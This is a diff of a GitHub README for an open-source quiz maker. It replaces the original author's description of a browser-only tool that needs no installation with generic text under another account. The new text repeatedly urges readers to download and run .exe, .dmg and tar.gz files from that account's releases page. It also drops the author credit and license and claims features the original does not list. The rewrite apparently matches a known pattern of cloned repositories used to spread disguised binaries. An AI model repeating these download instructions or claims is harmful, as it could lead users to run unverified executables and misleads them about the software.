@@ -1,163 +1,60 @@
-# Exam-Quiz-Test-PRO
+# 🎓 Exam-Quiz-Test-PRO - Create Quizzes Effortlessly 
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-**Discord**: [Join our server](https://discord.gg/4enDY8yhuS)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Exam--Quiz--Test--PRO-blue.svg)](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases)
 
-> ❤️ **All in one open-source free advanced browser based quiz maker software with dark mode and over 20 featues!**
+## 📖 Overview
+Exam-Quiz-Test-PRO is a powerful and user-friendly quiz generator. This open-source software allows you to create quizzes easily with a clean graphical interface. Enjoy features like dark mode and an extensive set of tools designed to enhance your quiz-making experience.
 
-The **PRO version** of [Exam-Quiz-Test](https://github.com/Refloow/Exam-Quiz-Test) - A powerful, feature-rich quiz creation and management platform that takes quiz-making to the next level with an intuitive quiz builder, enhanced editing capabilities, and support for rich media content.
+## 🚀 Getting Started
+Follow these simple steps to download and run Exam-Quiz-Test-PRO. 
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
+### 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, or Safari.
+- **Memory**: At least 2 GB RAM is recommended.
+  
+## 📂 Download & Install
+1. Visit the [Releases page](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases) to find the latest version of Exam-Quiz-Test-PRO.
+2. On the Releases page, look for the version you want to download. 
+3. Click on the appropriate file for your operating system:
+   - For Windows, choose `Exam-Quiz-Test-PRO-Windows.exe`.
+   - For macOS, select `Exam-Quiz-Test-PRO-macOS.dmg`.
+   - For Linux, download `Exam-Quiz-Test-PRO-Linux.tar.gz`.
+4. After the download completes, locate the file on your computer. 
 
----
+#### 🏃 Running the Application
+1. **Windows**: Double-click on `Exam-Quiz-Test-PRO-Windows.exe` to start the installation process.
+2. **macOS**: Open the `Exam-Quiz-Test-PRO-macOS.dmg` file and drag the application icon to your Applications folder. Then, launch it from there.
+3. **Linux**: Extract the tar.gz file and run the application from the extracted folder.
 
-## 🎯 What's New in PRO
+### 🔧 Features
+- **User-Friendly Interface**: Simple navigation and layout.
+- **Dark Mode**: Customize your experience with an eye-friendly theme.
+- **Multiple Question Types**: Create multiple-choice, true/false, and fill-in-the-blank questions.
+- **Preview Functionality**: Check how your quiz looks before publishing.
+- **Export Options**: Save your quizzes as PDFs or HTML files.
+- **Question Banks**: Store frequently used questions for easy retrieval.
+- **Customizable Themes**: Change colors and styles to match your preferences.
 
-The PRO version is a complete upgrade from the basic Exam-Quiz-Test platform, featuring:
+## 📝 Creating Your First Quiz
+1. Open the application after installation.
+2. Click on "Create New Quiz."
+3. Enter a title and description for your quiz.
+4. Choose the type of questions you want to include and start adding them.
+5. Once you finish adding questions, click “Preview” to see how your quiz looks.
+6. Save your quiz in your preferred format.
 
-### 🚀 **Advanced Quiz Builder**
-- **Visual Quiz Builder Interface** - Create quizzes without touching code
-- **Intuitive Question Editor** - Add, edit, and delete questions in seconds
+## 📚 Help & Support
+If you have any questions or need assistance, check the [GitHub Issues](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/issues) page to see if your question is already answered or to submit a new question.
 
-  <img width="2120" height="1120" alt="image" src="https://github.com/user-attachments/assets/1d62b9a6-756b-4512-9c84-51b016602baf" />
+## 📣 Community Feedback
+Your feedback is important! Join the discussion in our [Discussion forum](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/discussions). Share your experiences or suggest improvements.
 
+## 🌍 Explore More
+Explore additional features and updates on the [GitHub Repository](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO). 
 
-### 📝 **Enhanced Question Management**
-- **Easy Add/Remove/Edit** - Manage questions before generating your test
-- **Bulk Operations** - Import/export question sets
-- **Question Templates** - Pre-built templates for common question types
+## 📥 Download Now Again
+[![Download](https://img.shields.io/badge/Download-Exam--Quiz--Test--PRO-blue.svg)](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases)
 
-<img width="1885" height="434" alt="image" src="https://github.com/user-attachments/assets/726b1455-7e30-4bb9-8d7f-9e8b8be476ac" />
-
-
-### 🖼️ **Rich Media Support**
-- **Image Support** - Add images to questions and answers
-
-<img width="1720" height="911" alt="image" src="https://github.com/user-attachments/assets/851e02f1-c2d6-4524-8ab9-566b5109e4f2" />
- 
-- **Code Blocks** - Use ``` to make a codeblock on start and end to get an enhanced code block display
-
-### ⚡ **Additional PRO Features**
-- **Improved JSON Format** - Better data structure for complex quizzes
-
----
-
-## ✨ Features (20+ Capabilities)
-
-### Core Features
-✅ **Customizable Questions & Timer** - Set quiz duration and question pool  
-✅ **Single & Multiple Choice Questions** - Support for both formats  
-✅ **Dark Mode** - Eye-friendly  
-✅ **Randomized Question & Answer Order** - Prevent cheating  
-✅ **Instant Feedback on Mistakes** - Learn while taking the quiz  
-✅ **Accurate Scoring System** - Fair and precise grading  
-✅ **No Installation Required** - Runs directly in browser  
-✅ **Mobile Responsive** - Works perfectly on all devices  
-
-### PRO Exclusive Features
-✅ **Visual Quiz Builder** - No coding required  
-✅ **Question Image Support** - Add visual elements   
-✅ **Export/Import Functionality** - Share quiz data easily  
-✅ **Partial Credit Scoring** - Advanced grading options  
-
----
-
-## 🚀 Quick Start
-
-To use the software, simply download the sigular quiz creator file run it in your browser, make your quiz as you wish
-export the quiz into a runnable file format and run the quiz.html file anywhere at any time on any device and play with your newly created quiz for practice or share it with friends!
-No dependencies, no build process, no complications! 🎉
-
----
-
-## 📊 Scoring System
-
-### Single Choice Questions
-- **Correct Answer**: 100% points
-- **Wrong Answer**: 0% points
-
-### Multiple Choice Questions
-- **All Correct**: 100% points
-- **Partial Correct (No wrong selections)**: Proportional percentage
-- **Any Wrong Selection**: 0% points (default) or configurable
-
----
-
-## 📱 Browser Compatibility
-✅ Chrome (latest)  
-✅ Firefox (latest)  
-✅ Safari (latest)  
-✅ Edge (latest)  
-✅ Mobile browsers (iOS Safari, Chrome Mobile)
-
----
-
-## 🆚 PRO vs Basic Version
-
-| Feature | Basic Version | PRO Version |
-|---------|--------------|-------------|
-| Visual Quiz Builder | ❌ | ✅ |
-| Easy Question Management | ❌ Manual JSON editing | ✅ GUI-based |
-| Image Support | ❌ | ✅ |
-| Export/Import | ❌ | ✅ |
-| Code Syntax Highlighting | Basic | Enhanced |
-| Mobile Optimization | Good | Excellent |
-
----
-
-## 🤝 Community & Support
-
-### Discord Server
-Join our community to:
-- Ask questions and get help
-- Share your quizzes and experiences
-- Discover other free open-source software
-- Contribute to development
-
-**👉 [Join Discord Server](https://discord.gg/4enDY8yhuS)**
-
-### Contributing
-We welcome contributions! Here's how you can help:
-
-1. **Report Bugs** - Submit issues on GitHub
-2. **Suggest Features** - Share your ideas
-3. **Submit Pull Requests** - Improve the code
-4. **Improve Documentation** - Help others understand
-5. **Share the Project** - Spread the word
-
----
-
-## 📄 License
-
-This project is **open-source** under the **MIT License**.
-
----
-
-## 🔗 Related Projects
-
-- **[Exam-Quiz-Test](https://github.com/Refloow/Exam-Quiz-Test)** - The basic version (predecessor)
-- More open-source projects by Refloow coming soon!
-
----
-
-## 🌟 Show Your Support
-
-If you find this project useful, please consider:
-- ⭐ Starring the repository
-- 🐛 Reporting bugs
-- 💡 Suggesting new features
-- 🔀 Forking and contributing
-- 📢 Sharing with others
-
----
-
-## 📞 Contact
-
-- **GitHub**: [@Refloow](https://github.com/Refloow)
-- **Discord**: [Join our server](https://discord.gg/4enDY8yhuS)
-
---- 
-
-**Built with ❤️ by Veljko Vuckovic @refloow**
-
-*Enjoy building amazing quizzes with Exam-Quiz-Test-PRO! 🚀*
+Your journey towards effortless quiz creation starts here. Enjoy using Exam-Quiz-Test-PRO!
